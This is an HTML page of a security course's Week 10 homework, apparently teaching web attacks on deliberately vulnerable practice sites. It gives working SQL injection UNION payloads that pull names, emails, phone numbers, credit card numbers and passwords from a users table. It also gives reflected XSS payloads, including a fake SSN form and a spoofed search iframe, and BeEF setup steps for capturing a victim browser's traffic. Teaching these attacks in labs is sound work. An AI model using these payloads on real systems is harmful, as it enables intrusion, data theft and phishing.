@@ -1,0 +1,133 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<style type="text/css">
+td, th { border: 1px solid #c3c3c3; padding: 0 3px 0 3px; }
+table { border-collapse: collapse; }
+img { max-width: 100%; }
+</style>
+<meta name="generator" content="ReText 7.2.3">
+<title>Week10_Homework</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+<h1>Week 10 - Supplementary Materials</h1>
+<p><a href="https://github.com/lawfareblog/hacking-cybersecurity/blob/main/week10/Week_10_Homework.md">Markdown</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.pdf">PDF</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.docx">MS Word DOCX</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.odt">Libre ODT</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.html">HTML</a></p>
+<h2>Introduction</h2>
+<p>Our attacks this week focus on Web applications and can be tried in any Web browser.</p>
+<h2>SQL Injection</h2>
+<p><a href="https://en.wikipedia.org/wiki/SQL_injection">SQL injection</a> takes advantage of poorly-sanitized inputs to inject code into Web applications and gather information from a database. This kind of attack is exemplified in this <a href="https://xkcd.com/327/">xkcd</a> comic.</p>
+<p><a href="https://xkcd.com/327/"><img src="images/xkcd-sql-injection.png" width="700" /></a></p>
+<p>We will use a purposefully-vulnerable Web application for this SQL injection attack.</p>
+<ul>
+<li><a href="http://testphp.vulnweb.com/artists.php">http://testphp.vulnweb.com/artists.php</a></li>
+</ul>
+<p>An example of a profile page for a musical artists is here:</p>
+<ul>
+<li><a href="http://testphp.vulnweb.com/artists.php?artist=2">http://testphp.vulnweb.com/artists.php?artist=2</a></li>
+</ul>
+<p>If we add a hyphen <code>-</code> to the URL string after <code>?artist=</code> to make the number <code>-2</code> we notice that there is a blank page displayed.</p>
+<ul>
+<li><a href="http://testphp.vulnweb.com/artists.php?artist=-2">http://testphp.vulnweb.com/artists.php?artist=-2</a></li>
+</ul>
+<p>Additionally, we can throw a SQL error using an apostrophe <code>&amp;apos;</code> character.</p>
+<ul>
+<li>[http://testphp.vulnweb.com/artists.php?artist=-2<code>](http://testphp.vulnweb.com/artists.php?artist=-2</code>)</li>
+</ul>
+<p>Now that we know we can break the Web app with simple injection of special characters and negative numbers, let's try to inject SQL commands: </p>
+<h3>Get All Database Table Names</h3>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database()--</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database()--</code></p>
+<p>You'll see from this command that there is a database table called <code>users</code> that we can try to gather information from.</p>
+<h3>Get All Database Column Names</h3>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(column_name) from information_schema.columns</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(column_name) from information_schema.columns</code></p>
+<p>You'll see from this command that there is are columns in the <code>users</code> table called <code>uname</code>,<code>cc</code>,<code>pass</code> and so on. These likely contain sensitive user data.</p>
+<h2>Get Username of Artist #2</h2>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(uname) from users --</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(uname) from users --</code></p>
+<h2>Get Name of Artist #2</h2>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(name) from users --</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(name) from users --</code></p>
+<h2>Get Phone Number for Artist #2</h2>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(phone) from users --</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(phone) from users --</code></p>
+<h2>Get Email Address for Artist #2</h2>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(email) from users --</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(email) from users --</code></p>
+<h2>Get Credit Card Number for Artist #2</h2>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(cc) from users --</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(cc) from users --</code></p>
+<h2>Get User Password for Artist #2</h2>
+<p>The SQL command: </p>
+<p><code>union select 1,2,group_concat(pass) from users --</code></p>
+<p>Tricking the Web app to execute the command: </p>
+<p><code>http://testphp.vulnweb.com/artists.php?artist=-2 
+union select 1,2,group_concat(pass) from users --</code></p>
+<p>This is why only hashes for passwords should be stored in application databases!</p>
+<h2>Cross-Site Scripting (XSS)</h2>
+<p>Cross-Site Scripting (XSS) attacks take advantage of unexpected behavior in a Web app and combine it with social engineering to trick users. It is a major component of <a href="https://en.wikipedia.org/wiki/Phishing">phishing</a>.</p>
+<h3>XSS Reflection Examples</h3>
+<p>We will use a purposefully-vulnerable Web application for this XSS attack. Like SQL injection, we will input markup and code that the application has not properly sanitized to create unexpected behavior. For XSS reflection attacks, we are forcing the Web app to "reflect" the code we send to it in the browser.</p>
+<p>The vulnerable Web app: </p>
+<ul>
+<li><a href="http://www.insecurelabs.org/task/Rule1">http://www.insecurelabs.org/task/Rule1</a></li>
+</ul>
+<p>Try these examples of HTML code: </p>
+<p><code>&lt;h1&gt;This is an XSS Attack Wow!&lt;/h1&gt;</code></p>
+<p><code>&lt;script&gt;alert('Attacked by Sean')&lt;\/script&gt;</code></p>
+<p><code>&lt;html&gt;&lt;body&gt;&lt;img src="https://i.imgflip.com/3ualft.jpg"&gt;&lt;/body&gt;&lt;/html&gt;</code></p>
+<p><code>&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/xm3YgoEiEDc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;</code></p>
+<p><code>&lt;iframe width="1200" height="1200" src="http://www.shinysearch.com/prank/fakegoogle.php?mode=demo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;</code></p>
+<p><code>&lt;html&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;button&gt;Click Here!&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</code></p>
+<p><code>&lt;html&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;SSN# &lt;input&gt;&lt;/input&gt;&lt;br&gt;&lt;br&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</code></p>
+<h4>Beef XSS</h4>
+<p>The <code>beef-xss</code> package can be used for more complex attacks that combine XSS on the client/local machine with a remote server to gather credentials. This is very useful for social engineering attacks that <a href="https://en.wikipedia.org/wiki/Clickjacking">clickjack</a> and execute JavaScript spyware that logs user activity.</p>
+<p>Install <code>beef-xss</code>: </p>
+<p><code>sudo apt-get install beef-xss</code></p>
+<p>Run it: </p>
+<p><code>sudo beef-xss</code></p>
+<ul>
+<li>Set the password on first run (<code>b33f</code> is easy to remember).</li>
+</ul>
+<p>Browse to the Beef XSS Dashboard: 
+* <a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a></p>
+<p>You can also replace 192.168.1.116 with your local IP address, for example: </p>
+<ul>
+<li><a href="http://192.168.1.116:3000/ui/panel">http://192.168.1.116:3000/ui/panel</a></li>
+</ul>
+<p>This browser session will be the "attacker".</p>
+<p>Now browse to this location in another Web browser (e.g., if you're in Firefox open Chrome) or use another machine. This browser session will be the "victim".</p>
+<ul>
+<li><a href="http://127.0.0.1:3000/demos/butcher/index.html">http://127.0.0.1:3000/demos/butcher/index.html</a></li>
+</ul>
+<p>Click a button on that web page as the "victim".</p>
+<ul>
+<li>Now go back to the Beef XSS panel as the "attacker" and look at the <code>Logs</code> tab. You should see all traffic from the "victim" Web session (i.e., the user who clicked on the fake butcher website button).</li>
+</ul>
+
+</body>
+</html>
